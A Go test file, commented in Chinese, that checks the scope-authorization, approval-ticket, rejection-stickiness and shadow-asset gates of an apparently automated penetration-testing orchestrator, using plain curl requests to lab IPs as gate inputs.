	// ④ 拒绝粘滞端到端：开单→拒绝→重试不开新单且给出拒绝话术
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s5", Type: "command",
		Input: "recon", Output: "发现 172.33.0.41 打印服务", ApprovedBy: "auto"})
	if msg := o.governanceGates(p, "s6", "curl -s http://172.33.0.41/", "run_command", false); !strings.Contains(msg, "已生成/在批") {
		t.Fatalf("新目标应开单: %s", msg)
	}
	aps2, _ := st.ListApprovals(p.ID)
	var ticket *store.Approval
	for _, ap := range aps2 {
		if ap.Target == "172.33.0.41" {
			ticket = ap
		}
	}
	if ticket == nil {
		t.Fatal("172.33.0.41 工单缺失")
	}
	ticket.Status = "rejected" // 库内等价 Approver.Decide 拒绝分支（测试装配 approver 为 nil）
	_ = st.SaveApproval(ticket)
	if msg := o.governanceGates(p, "s6", "curl -s http://172.33.0.41/", "run_command", false); !strings.Contains(msg, "已被拒绝") || strings.Contains(msg, "已生成/在批") {
		t.Fatalf("拒绝粘滞端到端: %s", msg)
	}
	if aps3, _ := st.ListApprovals(p.ID); len(aps3) != 2 {
		t.Fatalf("拒绝后不得重开新单: %+v", aps3)
	}

	// ⑤ 影子资产端到端：影子门先行于范围门
	_, _ = st.AddAsset(&store.Asset{ProjectID: p.ID, Stage: "s2", Type: "domain", Value: "shadow-e2e.test",
		ScopeStatus: "shadow_pending", Detail: "e2e 影子"})
	if msg := o.governanceGates(p, "s6", "curl -s http://shadow-e2e.test/", "run_command", false); !strings.Contains(msg, "已登记但未授权测试") {
		t.Fatalf("影子资产应影子门先行: %s", msg)
	}

	// ⑥ 回执卫生：治理链全部拦截留证均带 -gate 标记（发现语料零污染）
	evs, _ := st.ListEvidence(p.ID)
	for _, e := range evs {
		if strings.Contains(e.Output, "被治理门拦截") || strings.Contains(e.Output, "被护栏拒绝") {
			if !strings.HasSuffix(e.ApprovedBy, "-gate") {
				t.Fatalf("拦截回执必须带 -gate 标记: %+v", e)
			}
		}
	}
}

// ⑮专项：bus 缺失（测试装配/部分构造）下确定性门工单链不得 SIGSEGV——v6.6.0 o.log
// 加固同款场景在工单发布/批准回调路径的闭环证明。
func TestV781NilBusTicketSurvival(t *testing.T) {
	_, st := v48Orchestrator(t)
	// 部分构造装配：与 v48Orchestrator 同构但 bus 缺失（vet 禁止结构体拷贝含锁值）
	dir := t.TempDir()
	cfg := &config.Config{}
	cfg.ApplyDefaultsForTest()
	cfg.DataDir = dir
	o := &Orchestrator{store: st, exec: newTestExec(t, dir), cfg: cfg, tokens: map[string]int64{}}
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-S", Name: "nilbus",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s5", Type: "command",
		Input: "recon", Output: "发现 172.33.0.50", ApprovedBy: "auto"})
	if blocked, msg := o.scopeGate(p, "curl -s http://172.33.0.50/"); !blocked || !strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("nil-bus 装配下工单链应存活: blocked=%v msg=%s", blocked, msg)
	}
	if aps, _ := st.ListApprovals(p.ID); len(aps) != 1 {
		t.Fatalf("工单应正常落库: %+v", aps)
	}
	if err := o.ApplyScopeExtension(p.ID, "172.33.0.50"); err != nil {
		t.Fatalf("nil-bus 装配下批准回调应存活: %v", err)
	}
	if blocked, _ := o.scopeGate(p, "curl -s http://172.33.0.50/"); blocked {
		t.Fatal("批准后应放行")
	}
}
